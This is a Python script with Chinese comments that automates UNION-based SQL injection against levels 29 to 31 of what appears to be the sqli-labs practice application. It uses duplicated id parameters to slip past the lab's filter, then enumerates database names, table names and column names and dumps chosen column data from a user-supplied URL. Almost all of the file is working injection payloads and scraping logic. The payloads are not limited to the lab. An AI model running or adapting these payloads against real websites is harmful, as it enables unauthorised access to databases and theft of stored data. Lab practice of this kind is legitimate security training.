import requests
from bs4 import BeautifulSoup


class Less29_Less31(object):

    def __init__(self,url,level,dbs,tables,columns,schema,d,t,c):

        if url[-1] == "/":

            self.url = url

        else:

            self.url = url + "/"

        self.level = level

        self.dbs = dbs

        self.tables = tables

        self.columns = columns            # 初始化

        self.schema = schema

        self.d = d

        self.t = t

        self.c = c




    def soup(self,text):

        soup = BeautifulSoup(text,"html5lib")    # 筛选数据

        strings = soup.find_all('font')[2].text

        return strings.split("You")[1].split(":")[1].split(",")




    def dbs_payload(self):

        if self.level == 29:   # level 29 payload

            rep = requests.get(self.url+"?id=1&id=0' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+")

            print(self.soup(rep.text))

                                # level 30 payload

        elif self.level == 30:

            rep = requests.get(self.url+'?id=1&id=0" union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+')

            print(self.soup(rep.text))

        elif self.level == 31:   # level 31 payload

            rep = requests.get(self.url+'?id=1&id=0") union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+')

            print(self.soup(rep.text))



    def tables_payload(self):

        if self.level == 29: # 29 payload

            rep = requests.get(self.url+"?id=1&id=0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='"+self.d+"'),3 --+")

            print(self.soup(rep.text))


        elif self.level == 30:           # 30 payload

            rep = requests.get(self.url+'?id=1&id=0" union select 1,(select group_concat(table_name) from information_schema.tables where table_schema="'+self.d+'"),3 --+')

            print(self.soup(rep.text))

        elif self.level == 31:           # 31 payload

            rep = requests.get(self.url+'?id=1&id=0") union select 1,(select group_concat(table_name) from information_schema.tables where table_schema="'+self.d+'"),3 --+')

            print(self.soup(rep.text))




    def columns_payload(self):

        if self.level == 29: # 29 payload

            rep = requests.get(self.url+"?id=1&id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"'),3 --+")

            print(self.soup(rep.text))

        elif self.level == 30:  # 30 payload

            rep = requests.get(self.url+'?id=1&id=0" union select 1,(select group_concat(column_name) from information_schema.columns where table_schema="'+self.d+'" and table_name="'+self.t+'"),3 --+')

            print(self.soup(rep.text))

        elif self.level == 31:  # 31 payload

            rep = requests.get(self.url+'?id=1&id=0") union select 1,(select group_concat(column_name) from information_schema.columns where table_schema="'+self.d+'" and table_name="'+self.t+'"),3 --+')

            print(self.soup(rep.text))




    def data_payload(self):

        if self.level == 29:  # 28a payload

            rep = requests.get(self.url+"?id=1&id=0' union select 1,(select group_concat("+self.c+") from "+self.d+"."+self.t+"),3 --+")

            print(self.soup(rep.text))


        elif self.level == 30:      # 30 payload

            rep = requests.get(self.url+'?id=1&id=0" union select 1,(select group_concat('+self.c+') from '+self.d+'.'+self.t+'),3 --+')

            print(self.soup(rep.text))

        elif self.level == 31:      # 31 payload

            rep = requests.get(self.url+'?id=1&id=0") union select 1,(select group_concat('+self.c+') from '+self.d+'.'+self.t+'),3 --+')

            print(self.soup(rep.text))




    def DBS(self):

        self.dbs_payload()


    def TABLES(self):           # 使用对应的payload

        self.tables_payload()


    def COLUMNS(self):

        self.columns_payload()


    def SCHEMA(self):

        self.data_payload()


    def TYPE(self):

        if self.dbs and not self.tables and not self.columns and not self.schema:  # 如果枚举数据库被设置

            self.DBS()

        elif self.d != '' and self.tables and not self.columns and not self.schema: # 如果枚举表和数据库名被设置

            self.TABLES()

        elif self.t != '' and self.columns and self.d != '' and not self.schema and not self.dbs and not self.tables: # 如果枚举列,和数据表,和数据列被设置

            self.COLUMNS()

        elif self.c != '' and self.t != '' and self.d != '' and self.schema and not self.dbs and not self.tables and not self.columns: # 如果数据表,数据库,数据列被设置

            self.SCHEMA()

        else:

            print("wrong options and bad type!")



    def Less_29(self):
        self.TYPE()
        

                              # 调用对应的level 等级
    def Less_30(self):
        self.TYPE()



    def Less_31(self):
        self.TYPE()
